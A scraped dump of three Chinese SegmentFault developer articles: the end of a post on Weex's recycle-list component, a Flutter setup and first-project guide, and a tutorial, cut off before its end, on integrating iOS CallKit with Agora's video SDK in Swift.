<p>从上面的数据可以看出，<code>&lt;list&gt;</code> 相比 <code>&lt;scroller&gt;</code> 已经有了较大的性能提升，<code>&lt;recycle-list&gt;</code> 比 <code>&lt;list&gt;</code> 的性能表现更加优秀。尤其在内存方面，<code>&lt;recycle-list&gt;</code> 在 iOS 下的内存占用量始终保持在个位数，在 Android 下除此加载时的内存和滑动到底部时的内存也分别优化了 42.7% 和 23.6%。</p>
<h2>研发历程</h2>
<p>recycle-list 不仅特别，也是开发跨时最久的一个组件了，从最早明确提出 <a href=""https://github.com/Hanks10100/incubator-weex/issues/1"" rel=""nofollow noreferrer"">Proposal</a>（2017/08/04）到发布 <a href=""http://weex-project.io/releasenote.html#v0-18-0"" rel=""nofollow noreferrer"">v0.18.0</a>（2018/02/09）历时长达半年之久。因为它是一个重要但不紧急的功能，在研发期间不断被打断，本身的技术难度由很大，涉及的技术面比较多，整个研发过程也是陆陆续续、磕磕绊绊、边探索边验证。</p>
<p>recycle-list 虽说是一个组件，但是它开辟了一条新的渲染模式，无论是前端框架、JS Framework 还是原生渲染引擎都有重构级别的改造；开发者也是多样的，前端、iOS、Android 都全程参与了。由于这个组件涉及大量对前端框架内部的改造，Vue.js 的原作者<a href=""https://github.com/yyx990803"" rel=""nofollow noreferrer"">尤雨溪</a>（微博 <a href=""https://weibo.com/p/1005051761511274"" rel=""nofollow noreferrer"">@尤小右</a>） 也深度参与了开发和讨论，尤其在前期讨论实现方案的时候提供了大量思路。这个组件无论是技术方案还是开发协作方式都和以往不同，可以说是相当特别了。</p>
<h3>先弄出来 MVP</h3>
<p>这个组件虽然开发历时很久，但是在讨论了大致思路以后，几乎在前几天内就做出了一个 MVP (Minimum Viable Product) 版本来验证想法，并且立即<a href=""https://github.com/Hanks10100/incubator-weex/issues/1#issuecomment-320965370"" rel=""nofollow noreferrer"">对比了渲染性能</a>。</p>
<p>为了快速验证想法，先随意约定了一套模板指令，绕过前端框架和 JS Framework 的渲染流程，直接<a href=""https://github.com/Hanks10100/weex-native-directive/blob/91c5de9ba9ef04cc7d005a217e683734e234ca5f/vanilla.js"" rel=""nofollow noreferrer"">手写 <code>callNative</code> 指令</a>将模板结构和数据发给客户端，客户端也不考虑兼容性和副作用，先实现了渲染和复用的基本逻辑。这个步骤只是用来验证设想的方案是否可行，如果行不通就没必要继续浪费时间。</p>
<p>虽然快速做出了 MVP 版本，看似已经成功一半，但是设计得太过粗糙，很多流程并未想清楚，原有列表的大部分功能都没有实现思路，真正的进度可能连 10% 都不到。</p>
<h3>明确技术方案</h3>
<p>验证了可行性之后，下一步并没有立即继续写代码，而是静下心来认真再讨论一下详细的技术方案。这个过程邀请了尤雨溪一起参与，从编译工具、上层语法糖到组件生命周期和状态同步等功能，都做过细致的分析和讨论。</p>
<p>最初在讨论的时候，觉得生命周期和有状态的子组件这些功能都是无法实现的，因为组件的私有状态和生命周期是在前端框架里的，然而组件渲染过程又完全交给了客户端来控制，语言都不一样，甚至不在同一个线程里，简直无法再联系起来。不过最终还是设计出了一系列的通信和状态同步机制，将功能做得更完善，下文有详解。</p>
<p>在明确实现细节的过程中，由于没有兼容历史版本的包袱，开发期间可以冷静思考真正合理并且好用的技术方案，不惜多次推翻原有的设计，反复重构代码，最终才能实现“看起来和旧的 list 差不多嘛，无非是用了新的名字多了 <code>for/switch/case</code> 的语法而已”这种效果。</p>
<h3>分期实现功能</h3>
<p>有了详细的设计以后，前端、iOS、Android 开发者分别独立开发，同时编译工具的用例也在不断的更新，三端都频繁的迭代，渐进式的完善功能。这个项目的前期工作做的比较足，先有的使用文档和实现方案，然后有的测试用例和各种 demo，最后才是写代码实现功能，开发流程还是比较工整的。</p>
<p>目前发布的第一个版本中，基础功能都完备了，但是存在较多<a href=""http://weex-project.io/cn/references/components/recycle-list.html#zhu-yi-shi-xiang"" rel=""nofollow noreferrer"">注意事项</a>，有些是组件固有的差异，还有些是正在讨论技术方案但还没来得及实现的功能，如<a href=""https://github.com/Hanks10100/weex-native-directive/issues/14"" rel=""nofollow noreferrer"">支持动态绑定样式类名</a>、双向绑定、<a href=""https://github.com/Hanks10100/weex-native-directive/issues/13"" rel=""nofollow noreferrer"">filter</a>、组件的自定义事件等。这些功能将在后续版本里逐步实现，虽然它们写出来只有短短几个字，看起来也都是现有组件理所当然就支持的功能，但是在 recycle-list 里可能对应了涉及多端的大范围改造。</p>
<h2>实现原理</h2>
<p>在前面的章节里介绍了可复用列表的渲染过程，这只是开了个头，想要实现这个效果，至少要涉及编译工具、客户端渲染引擎以及前端框架里的改造。</p>
<h3>自定义原生渲染指令</h3>
<p>把“渲染方法”发给客户端，说起来简单，这里边包含了循环、条件、使用自定义组件的逻辑，能把它们完备地发给客户端吗？<strong>绝大多数渲染逻辑都可以。</strong> 要实现这个功能，就得设计一套描述渲染逻辑的原生指令，保障自身的完备性，然后对接上层前端框架中的模板语法，这个对接过程可以交给工具在编译期实现。</p>
<p>以 Vue 为例，它提供了<a href=""https://cn.vuejs.org/v2/guide/single-file-components.html"" rel=""nofollow noreferrer"">单文件组件</a>的语法，其中 <code>v-bind</code> 、 <code>v-for</code> 、 <code>v-if</code> 之类的特殊属性（模板指令），以及 <code>{{}}</code> 中的数据绑定都是描述渲染逻辑的，这些特殊语法如果用在 recycle-list 里，将会被编译工具编译成 Weex 支持的原生渲染指令。这层渲染指令是面向客户端的渲染行为设计的，是原生渲染器和 JS Framework 之间的约定，可以对接到 Vue 和 Rax 等多个上层框架，语法基本上都是一一对应的。具体的语法规则，可以参考 <a href=""https://github.com/Hanks10100/weex-native-directive/blob/master/Implementation.md#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"" rel=""nofollow noreferrer"">Implementation.md#模板语法</a>。</p>
<blockquote>Vue 里的渲染逻辑是声明式的写在模板里的，因此可以很容易的编译成 Weex 的原生渲染指令，整个转换过程可以融入到现有的编译工具中处理，对上层开发者透明，基本上对开发过程无影响，也不影响原有功能。在 Rax/React 的渲染函数中，标签语法可以使用 JSX 编写，但是模板的渲染规则（循环和条件）仍然由 JS 脚本来控制，是命令式的而不是声明式的，很难编译成静态的描述，要想使用长列表的复用功能，需要对开发时的写法做特殊约定，或者使用特殊的<em>渲染流程控制组件</em>。</blockquote>
<h3>客户端根据数据渲染模板</h3>
<p>客户端拿到了数据和模板以后，在内部建立起 Watcher 和 Updater 的更新机制，由数据驱动模板的渲染。在最初渲染时只渲染屏幕内呈现出来的节点。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV5Dpr?w=709&amp;h=337"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>当列表向下滚动时，回收掉上方不在屏幕内的模板，并不销毁而是将其中的数据清空。当列表下方需要渲染新的数据时，会取出回收的空模板，注入数据渲染出真实节点，然后追加到列表下方。列表向上滚动时的原理是一样的，为了保障列表滚动的流畅，也会渲染屏幕上下方扩展区域内的节点。无论真实的数据有多少条，真实渲染的只有可滚动区域内的节点，这样不仅可以加快首屏的渲染速度，内存的占用量也不会随着列表长度大幅增长。</p>
<blockquote>由于我只是个前端开发，对于客户端里的底层细节就不在这里班门弄斧了，期待客户端开发者再详细介绍一下这一部分。</blockquote>
<h3>使用 Virtual Component 管理组件状态</h3>
<p>想让客户端只根据模板和数据就能渲染出来节点，看起来只有函数式组件才可以做到，也就是要求组件必须是不含内部状态的，然而实际应用中绝大多数组件都含有内部状态的，只做到这一步是远远不够的。</p>
<p>对于包含了状态的组件，渲染过程就比较复杂了，因为组件内部状态的处理逻辑（<code>data</code>,<code>watch</code>, <code>computed</code>）都在前端中，然而模板和数据都已经发给客户端处理了，所以需要经过多个回合的通信来解决状态同步问题（详细处理过程可以参考 <a href=""https://github.com/Hanks10100/weex-native-directive/blob/master/Implementation.md#%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B"" rel=""nofollow noreferrer"">Implementation.md#渲染过程</a>）。</p>
<p>为了实现可复用的原生组件，在前端框架中引入了 <strong>Virtual Component Template</strong> 和 <strong>Virtual Component</strong> 这两个概念：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV5DpL?w=1648&amp;h=1080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在渲染的过程中，如果发现某个组件用在了 <code>&lt;recycle-list&gt;</code> 里，就不再走之前的处理逻辑，而是创建一个 Virtual Component Template，并且不初始化任何状态（<code>data</code>,<code>watch</code>, <code>computed</code>）、不绑定生命周期，但是会初始化自定义事件的功能。渲染组件时不执行 <code>render</code> 函数，而是执行定制的 <code>@render</code> 函数生成带有原生渲染指令的模板结构，这个结构将一次性发给客户端，后续不会再修改。</p>
<p>在创建 Virtual Component Template 时，会监听客户端原生组件的 <code>create</code> 生命周期钩子，当客户端派发了 <code>create</code> 的时候，才会真正的开始创建只含状态不含节点的 Virtual Component。虚拟组件模板只有一份，但是从同一份模板创建出的 Virtual Component 会有多个，与客户端发送的 <code>create</code> 钩子的次数有关，与数据有关。另外，由于事件是绑定在节点上的，原生 UI 捕获到的事件只会派发给 Virtual Component Template，然后再找到相应的 Virtual Component 并以其为作用域执行事件处理函数。</p>
<p>Virtual Component 内部只管理数据，即使数据有变动也不会触发渲染，而是调用特殊接口向客户端更新组件的内部状态，由客户端根据新数据更新组件的 UI。在创建 Virtual Component 时，会监听客户端原生组件的 <code>attach</code> 、<code>detach</code> 、 <code>update</code> 、 <code>syncState</code> 生命周期，生命周期的派发有客户端来控制，<a href=""http://weex-project.io/cn/references/components/recycle-list.html#sheng-ming-zhou-qi-de-xing-wei-chai-yi"" rel=""nofollow noreferrer"">语义和前端框架略有差异</a>。</p>
<h2>题外话</h2>
<p>Weex 是个开源项目，是一个社区项目，分享经验、贡献代码、贡献想法、修订文档都算是为开源项目贡献力量，我相信有许多开发者都使用过 Weex，也踩过一些坑，积累了实践经验，也希望大家能多多分享，一起参与改善 Weex，让它变得更强大用起来更顺手。</p>

                ", Weex 的 recycle-list 诞生记,1531971887,433,1,313,1,1,https://segmentfault.com/a/1190000013697211
24,1,0,6,"
                    
<h1>准备阶段</h1>
<h2>下载 Flutter SDK</h2>
<p>新建 Flutter 文件夹，克隆 Flutter SDK：</p>
<pre><code class=""bash"">git clone -b beta https://github.com/flutter/flutter.git</code></pre>
<h2>配置 Flutter 环境</h2>
<p>我是 Mac 系统，Flutter SDK 下载完后的路径：Users/wuxiaolong/Flutter/flutter/ 。</p>
<h3>在命令行下，进入用户目录</h3>
<pre><code class=""bash"">cd $HOME</code></pre>
<h3>打开.bash_profile文件</h3>
<p>执行命令打开文件：</p>
<pre><code class=""bash"">open -e .bash_profile</code></pre>
<p>打开文件后，添加 Flutter SDK 安装的路径：</p>
<pre><code class=""bash"">export PATH=${PATH}:/Users/wuxiaolong/Flutter/flutter/bin:$PATH</code></pre>
<h3>更新刚配置的环境变量</h3>
<pre><code class=""bash"">source .bash_profile</code></pre>
<h3>验证</h3>
<p>终端直接输入  flutter，没有提示该命令找不到，则配置成功。</p>
<h2>flutter doctor</h2>
<p>命令行输入<code>flutter doctor</code>，安装 Futter 剩余依赖项。</p>
<h2>安装 Flutter 和 Dart 插件</h2>
<p>启动 Android Studio，搜索 Flutter 插件并单击 install，系统提示您安装 Dart 插件，点击 Yes 安装即可。</p>
<p><strong>提示</strong>：安装 Dart 插件可能会提示下载失败，多试几次。</p>
<h2>第一个项目</h2>
<p>Android Studio - File - New - New Flutter Project，等待创建成功后，运行效果如下：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013624594?w=3352&amp;h=1916"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h1>Dart 基本语法</h1>
<p>Flutter 开发语言是 Dart，这个语言相信我们做原生 Android 的都能看懂，我在学习过程，感觉这不就是 Java 嘛，我直接按照 Java 思维去写，完全没问题。</p>
<ol>
<li>基础数据类型有 int、double、bool、String、List（数组）、Map；</li>
<li>声明变量可以使用 var，也可以使用 const 和 final；</li>
<li>const 和 final 定义的都是常量，值不能改变，并且在声明的时候就必须初始化，这是可以省略 var 或者其他类型；</li>
<li>函数可以有可选参数；</li>
<li>if-else、for 循环、while 循环、switch-case、try-catch 等知识与 Java  类似；</li>
</ol>
<p>更多详见官网：<a href=""https://www.dartlang.org/"" rel=""nofollow noreferrer"">https://www.dartlang.org/</a></p>
<h1>练手</h1>
<p>这里使用了豆瓣电影的 API，功能很简单，就一个列表和详情。</p>
<h2>效果预览</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013624595?w=429&amp;h=852"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>遇到问题</h2>
<p>学习新知识，第一步就是模仿，多看，多想，多实践，在这个过程我遇到一些问题：</p>
<ol>
<li>Flutter 怎么打印信息？<code>print('onclick');</code>
</li>
<li>Flutter 如何看报错信息？在 Android Studio 底栏 Run 非 LogCat；</li>
<li>网络请求怎么写？</li>
<li>接口数据如何解析的？</li>
<li>如何一进页面就请求接口？</li>
<li>网络图片怎么显示？</li>
<li>ListView 官网介绍的 Item 是通用的，如何定制？</li>
<li>跳转页面如何传参？传参后怎么用？</li>
</ol>
<p>等等，遇到一个问题，消灭一个。</p>
<h1>源码</h1>
<h2>源码地址</h2>
<p><a href=""https://github.com/WuXiaolong/flutter_movie"" rel=""nofollow noreferrer"">https://github.com/WuXiaolong...</a> ，该项目起始页面在 lib/main.dart，注意的点我也都加了注释，去吧，学习还是要靠自己，踏出第一步，实践起来。</p>
<h2>如何导入 Flutter 项目</h2>
<h3>下载 Flutter 项目</h3>
<p>下载完 Flutter 项目，直接 Android Studio - Open。</p>
<h3>配置 Flutter SDK</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013624596?w=2460&amp;h=224"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>如图，点击 Open Flutter setting，点击下拉按钮，选择 Flutter SDK 路径，点击 OK，会自动配置 Dart SDK 路径。</p>
<h3>pubspec.yaml 下载库</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013624597?w=2464&amp;h=174"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>如图，点击 Packages get，下载项目用到的依赖库，编译完成应该就能正常运行了。</p>
<h1>最后</h1>
<ol>
<li>还是被 Flutter 惊艳到了，重拾当初学习 Android 的热情，却一不小心，我的肩痛又开始了；</li>
<li>Flutter UI 全是代码写的，不是 XML，复杂的 UI 实现有难度；</li>
<li>Flutter 联想功能较弱，需要先导入相应的包，才有相应的类联想；</li>
<li>新建了一个 package，将 dart 文件拖入，相关联包的路径会相应修改，但是我改了package 名，就无法相应修改，bug？</li>
<li>Flutter，我感觉可以从 Java 实现无缝过度；</li>
<li>I'm a iOS Developer.</li>
<li>Flutter 开源库远没有原生的丰富，目前还是 Beta 版，还是很值得期待，我会持续关注学习，先就酱紫吧。</li>
</ol>
<h1>相关阅读</h1>
<p><a href=""https://flutter.io/"" rel=""nofollow noreferrer"">Flutter 官网</a></p>
<p><a href=""http://wuxiaolong.me/2017/07/19/mac-adb-gradlew/"" rel=""nofollow noreferrer"">Mac 配置 adb 环境、gradlew：command not found</a></p>
<p><a href=""https://github.com/CodemateLtd/FlutterMates"" rel=""nofollow noreferrer"">FlutterMates</a></p>
<h1>公众号</h1>
<p>我的公众号：吴小龙同学，欢迎交流～<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013344064?w=1920&amp;h=1080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>

                ", Flutter 初尝：从 Java 无缝过渡,1531971888,463,1,286,1,1,https://segmentfault.com/a/1190000013624591
25,1,0,6,"
                    
<blockquote>作者简介：龚宇华，声网 Agora.io 首席 iOS 研发工程师，负责 iOS 端移动应用产品设计和技术架构。</blockquote>
<h2>简介</h2>
<p>CallKit 是苹果在 iOS10 中推出的，专为 VoIP 通话场景设计的系统框架，在 iOS 上为 VoIP 通话提供了系统级的支持。</p>
<p>在 iOS10 以前，VoIP 场景的体验存在很多局限。比如没有专门的来电呼叫通知方式，App 在后台接收到来电呼叫后，只能使用一般的系统通知方式提示用户。如果用户关掉了通知权限，就会错过来电。VoIP 通话本身也很容易被打断。比如用户在通话过程中打开了另一个使用音频设备的应用，或者接到了一个运营商电话，VoIP 通话就会被打断。</p>
<p>为了改善 VoIP 通话的用户体验问题，CallKit 框架在系统层面把 VoIP 通话提高到了和运营商通话一样的级别。当 App 收到来电呼叫后，可以通过 CallKit 把 VoIP 通话注册给系统，让系统使用和运营商电话一样的界面提示用户。在通话过程中，app 的音视频权限也变成和运营商电话一样，不会被其他应用打断。VoIP 通话过程中接到运营商电话时，在界面上由用户自己选择是否挂起 /挂断当前的 VoIP 通话。</p>
<p>另外，使用了 CallKit 框架的 VoIP 通话也会和运营商电话一样出现在系统的电话记录中。用户可以直接在通讯录和电话记录中发起新的 VoIP 呼叫。</p>
<p>因此，一个有 VoIP 通话场景的应用应该尽快集成 CallKit，以大幅提高用户体验和使用便捷性。</p>
<p>下面我们就来看下 CallKit 的使用方法，并且把它集成到一个使用 Agora SDK 的视频通话应用中。</p>
<h2>CallKit 基本类介绍</h2>
<p>CallKit 最重要的类有两个，<code>CXProvider</code> 和 <code>CXCallController</code>。这两个类是 CallKit 框架的核心。</p>
<h3><em> CXProvider </em></h3>
<p><code>CXProvider</code> 主要负责通话流程的控制，向系统注册通话和更新通话的连接状态等。重要的 api 有下面这些：</p>
<pre><code>open class CXProvider : NSObject {
    
    /// 初始化方法
    public init(configuration: CXProviderConfiguration)

    /// 设置回调对象
    open func setDelegate(_ delegate: CXProviderDelegate?, queue: DispatchQueue?)

    /// 向系统注册一个来电。如果注册成功，系统就会根据 CXCallUpdate 中的信息弹出来电画面
    open func reportNewIncomingCall(with UUID: UUID, update: CXCallUpdate, completion: @escaping (Error?) -&gt; Swift.Void)

    /// 更新一个通话的信息
    open func reportCall(with UUID: UUID, updated update: CXCallUpdate)

    /// 告诉系统通话开始连接
    open func reportOutgoingCall(with UUID: UUID, startedConnectingAt dateStartedConnecting: Date?)

    /// 告诉系统通话连接成功
    open func reportOutgoingCall(with UUID: UUID, connectedAt dateConnected: Date?)

    /// 告诉系统通话结束
    open func reportCall(with UUID: UUID, endedAt dateEnded: Date?, reason endedReason: CXCallEndedReason)
}</code></pre>
<p>可以看到，<code>CXProvider</code> 使用 <code>UUID</code> 来标识一个通话，使用 <code>CXCallUpdate</code> 类来设置通话的属性。开发者可以使用正确格式的字符串为每个通话创建对应的 <code>UUID</code>；也可以直接使用系统创建的 <code>UUID</code>。</p>
<p>用户在系统界面上对通话进行的操作都通过 <code>CXProviderDelegate</code> 中的回调方法通知应用。</p>
<h3>CXCallController</h3>
<p><code>CXCallController</code> 主要负责执行对通话的操作。</p>
<pre><code>open class CXCallController : NSObject {

    /// 初始化方法
    public convenience init()
    
    /// 获取 callObserver，通过 callObserver 可以得到系统所有进行中的通话的 uuid 和通话状态
    open var callObserver: CXCallObserver { get }

    /// 执行对一个通话的操作
    open func request(_ transaction: CXTransaction, completion: @escaping (Error?) -&gt; Swift.Void)
}</code></pre>
<p>其中 <code>CXTransaction</code> 是一个操作的封装，包含了动作 <code>CXAction</code> 和通话 <code>UUID</code>。发起通话、接听通话、挂断通话、静音通话等动作都有对应的 <code>CXAction</code> 子类。</p>
<h2>和 Agora SDK 结合</h2>
<p>下面我们看下怎么在一个使用 Agora SDK 的视频通话应用中集成 CallKit。Demo 的完整代码见 <a href=""https://github.com/AgoraIO/Agora-RTC-With-CallKit"" rel=""nofollow noreferrer"">Github 地址</a></p>
<h3>实现视频通话</h3>
<p>首先快速实现一个视频通话的功能。</p>
<p>使用 AppId 创建 <code>AgoraRtcEngineKit</code> 实例：</p>
<pre><code>private lazy var rtcEngine: AgoraRtcEngineKit = AgoraRtcEngineKit.sharedEngine(withAppId: &lt;#Your AppId#&gt;, delegate: self)</code></pre>
<p>设置 ChannelProfile 和本地预览视图：</p>
<pre><code>override func viewDidLoad() {
    super.viewDidLoad()
        
    rtcEngine.setChannelProfile(.communication)
    
    let canvas = AgoraRtcVideoCanvas()
    canvas.uid = 0
    canvas.view = localVideoView
    canvas.renderMode = .hidden
    rtcEngine.setupLocalVideo(canvas)
}</code></pre>
<p>在 <code>AgoraRtcEngineDelegate</code> 的远端用户加入频道事件中设置远端视图：</p>
<pre><code>extension ViewController: AgoraRtcEngineDelegate {
    func rtcEngine(_ engine: AgoraRtcEngineKit, didJoinedOfUid uid: UInt, elapsed: Int) {
        let canvas = AgoraRtcVideoCanvas()
        canvas.uid = uid
        canvas.view = remoteVideoView
        canvas.renderMode = .hidden
        engine.setupRemoteVideo(canvas)
        
        remoteUid = uid
        remoteVideoView.isHidden = false
    }
}</code></pre>
<p>实现通话开始、静音、结束的方法：</p>
<pre><code>extension ViewController {
    func startSession(_ session: String) {
        rtcEngine.startPreview()
        rtcEngine.joinChannel(byToken: nil, channelId: session, info: nil, uid: 0, joinSuccess: nil)
    }
    
    func muteAudio(_ mute: Bool) {
        rtcEngine.muteLocalAudioStream(mute)
    }
    
    func stopSession() {
        remoteVideoView.isHidden = true
        
        rtcEngine.leaveChannel(nil)
        rtcEngine.stopPreview()
    }
}</code></pre>
<p>至此，一个简单的视频通话应用搭建就完成了。双方只要调用 <code>startSession(_:)</code> 方法加入同一个频道，就可以进行视频通话。</p>
<h3>来电显示</h3>
<p>我们首先创建一个专门的类 <code>CallCenter</code> 来统一管理 <code>CXProvider</code> 和 <code>CXCallController</code>。</p>
<pre><code>class CallCenter: NSObject {
        
    fileprivate let controller = CXCallController()
    private let provider = CXProvider(configuration: CallCenter.providerConfiguration)
    
    private static var providerConfiguration: CXProviderConfiguration {
        let appName = ""AgoraRTCWithCallKit""
        let providerConfiguration = CXProviderConfiguration(localizedName: appName)
        providerConfiguration.supportsVideo = true
        providerConfiguration.maximumCallsPerCallGroup = 1
        providerConfiguration.maximumCallGroups = 1
        providerConfiguration.supportedHandleTypes = [.phoneNumber]
        
        if let iconMaskImage = UIImage(named: &lt;#Icon file name#&gt;) {
            providerConfiguration.iconTemplateImageData = UIImagePNGRepresentation(iconMaskImage)
        }
        providerConfiguration.ringtoneSound = &lt;#Ringtone file name#&gt;
        
        return providerConfiguration
    }
}</code></pre>
<p>其中 <code>providerConfiguration</code> 设置了 CallKit 向系统注册通话时需要的一些基本属性。比如 <code>localizedName</code> 告诉系统向用户显示应用的名称。<code>iconTemplateImage</code> 给系统提供一张图片，以在锁屏的通话界面中显示。<code>ringtoneSound</code> 是自定义来电响铃文件。</p>
<p>接着，我们创建一个接收到呼叫后把呼叫通过 CallKit 注册给系统的方法。</p>
<pre><code>func showIncomingCall(of session: String) {
    let callUpdate = CXCallUpdate()
    callUpdate.remoteHandle = CXHandle(type: .phoneNumber, value: session)
    callUpdate.localizedCallerName = session
    callUpdate.hasVideo = true
    callUpdate.supportsDTMF = false
    
    let uuid = pairedUUID(of: session)
    
    provider.reportNewIncomingCall(with: uuid, update: callUpdate, completion: { error in
        if let error = error {
            print(""reportNewIncomingCall error: \(error.localizedDescription)"")
        }
    })
}</code></pre>
<p>简单起见，我们用对方的手机号码字符串做为通话 session 标示，并构造一个简单的 session 和 UUID 匹配查询系统。最后在调用了 <code>CXProvider</code> 的 <code>reportNewIncomingCall(with:update:completion:)</code> 方法后，系统就会根据 <code>CXCallUpdate</code> 中的信息，弹出和运营商电话类似的界面提醒用户。用户可以接听或者拒接，也可以点击第六个按钮打开 app。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013585497"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>接听 /挂断通话</h3>
<p>用户在系统界面上点击“接受”或“拒绝”按钮后，CallKit 会通过 <code>CXProviderDelegate</code> 的相关回调通知 app。</p>
<pre><code>func provider(_ provider: CXProvider, perform action: CXAnswerCallAction) {
    guard let session = pairedSession(of:action.callUUID) else {
        action.fail()
        return
    }
    
    delegate?.callCenter(self, answerCall: session)
    action.fulfill()
}

func provider(_ provider: CXProvider, perform action: CXEndCallAction) {
    guard let session = pairedSession(of:action.callUUID) else {
        action.fail()
        return
    }
    
    delegate?.callCenter(self, declineCall: session)
    action.fulfill()
}</code></pre>
<p>通过回调传入的 <code>CXAction</code> 对象，我们可以知道用户的操作类型以及通话对应的 UUID。最后通过我们自己定义的 <code>CallCenterDelegate</code> 回调通知到 app 的 <code>ViewController</code> 中。</p>
<h3>发起通话 /静音 /结束通话</h3>
<p>使用 <code>CXStartCallAction</code> 构造一个 <code>CXTransaction</code>，我们就可以用 <code>CXCallController</code> 的 <code>request(_:completion:)</code> 方法向系统注册一个发起的通话。</p>
<pre><code>func startOutgoingCall(of session: String) {
    let handle = CXHandle(type: .phoneNumber, value: session)
    let uuid = pairedUUID(of: session)
    let startCallAction = CXStartCallAction(call: uuid, handle: handle)
    startCallAction.isVideo = true
    
    let transaction = CXTransaction(action: startCallAction)
    controller.request(transaction) { (error) in
        if let error = error {
            print(""startOutgoingSession failed: \(error.localizedDescription)"")
        }
    }
}</code></pre>
<p>同样的，我们可以用 <code>CXSetMutedCallAction</code> 和 <code>CXEndCallAction</code> 来静音 /结束通话。</p>
<pre><code>func muteAudio(of session: String, muted: Bool) {
    let muteCallAction = CXSetMutedCallAction(call: pairedUUID(of: session), muted: muted)
    let transaction = CXTransaction(action: muteCallAction)
    controller.request(transaction) { (error) in
        if let error = error {
            print(""muteSession \(muted) failed: \(error.localizedDescription)"")
        }
    }
}

func endCall(of session: String) {
    let endCallAction = CXEndCallAction(call: pairedUUID(of: session))
    let transaction = CXTransaction(action: endCallAction)
    controller.request(transaction) { error in
        if let error = error {
            print(""endSession failed: \(error.localizedDescription)"")
        }
    }
}</code></pre>
<h3>模拟来电和呼叫</h3>
<p>真实的 VoIP 应用需要使用信令系统或者 iOS 的 <a href=""https://developer.apple.com/documentation/pushkit"" rel=""nofollow noreferrer"">PushKit</a> 推送，来实现通话呼叫。为了简单起见，我们在 Demo 上添加了两个按钮，直接模拟收到了新的通话呼叫和呼出新的通话。</p>
<pre><code>private lazy var callCenter = CallCenter(delegate: self)

@IBAction func doCallOutPressed(_ sender: UIButton) {
    callCenter.startOutgoingCall(of: session)
}

@IBAction func doCallInPressed(_ sender: UIButton) {
    callCenter.showIncomingCall(of: session)
}</code></pre>
<p>接着通过实现 <code>CallCenterDelegate</code> 回调，调用我们前面已经预先实现了的使用 Agora SDK 进行视频通话功能，一个完整的 CallKit 视频应用就完成了。</p>
<pre><code>extension ViewController: CallCenterDelegate {
    func callCenter(_ callCenter: CallCenter, startCall session: String) {
        startSession(session)
    }
    
    func callCenter(_ callCenter: CallCenter, answerCall session: String) {
        startSession(session)
        callCenter.setCallConnected(of: session)
    }
    
    func callCenter(_ callCenter: CallCenter, declineCall session: String) {
        print(""call declined"")
    }
    
    func callCenter(_ callCenter: CallCenter, muteCall muted: Bool, session: String) {
        muteAudio(muted)
    }
    
    func callCenter(_ callCenter: CallCenter, endCall session: String) {
        stopSession()
    }
}</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013585498"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""通话中的界面"" title=""通话中的界面""></span></p>
<p>通话过程中在音频外放的状态下锁屏，会显示类似运营商电话的通话界面。不过可惜的是，目前 CallKit 还不支持像 FaceTime 那样的在锁屏下显示视频的功能。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013585499"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>通讯录 /系统通话记录</h3>
<p>使用了 CallKit 的 VoIP 通话会出现在用户系统的通话记录中，用户可以像运营商电话一样直接点击通话记录发起新的 VoIP 呼叫。同时用户通讯录中也会有对应的选项让用户直接使用支持 CallKit 的应用发起呼叫。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013585500"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""通话记录"" title=""通话记录""></span></p>
<p>实现这个功能并不复杂。无论用户是点击通信录中按钮，还是点击通话记录，系统都会启动打开对应 app，并触发 <code>UIApplicationDelegate</code> 的 <code>application(_:continue:restorationHandler:)</code> 回调。我们可以在这个回调方法中获取到被用户点击的电话号码，并开始 VoIP 通话。</p>
<pre><code>func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool {
    guard let interaction = userActivity.interaction else {
        return false
    }
    
    var phoneNumber: String?
    if let callIntent = interaction.intent as? INStartVideoCallIntent {
        phoneNumber = callIntent.contacts?.first?.personHandle?.value
    } else if let callIntent = interaction.intent as? INStartAudioCallIntent {
        phoneNumber = callIntent.contacts?.first?.personHandle?.value
    }
    
    let callVC = window?.rootViewController as? ViewController
    callVC?.applyContinueUserActivity(toCall:phoneNumber)
    
    return true
}

extension ViewController {
    func applyContinueUserActivity(toCall phoneNumber: String?) {
        guard let phoneNumber = phoneNumber, !phoneNumber.isEmpty else {
            return
        }
        phoneNumberTextField.text = phoneNumber
        callCenter.startOutgoingCall(of: session)
    }
}</code></pre>
<h2>一些注意点</h2>
<ol>
<li>必需在项目的后台模式设置中启用 VoIP 模式，才可以正常使用 CallKit 的相关功能。这个模式需要在 <code>Info.plist</code> 文件的 <code>UIBackgroundModes</code> 字段下添加 <code>voip</code> 项来开启。 如果没有开启后台 VoIP 模式，调用 <code>reportNewIncomingCall(with:update:completion:)</code> 等方法不会有效果。</li>
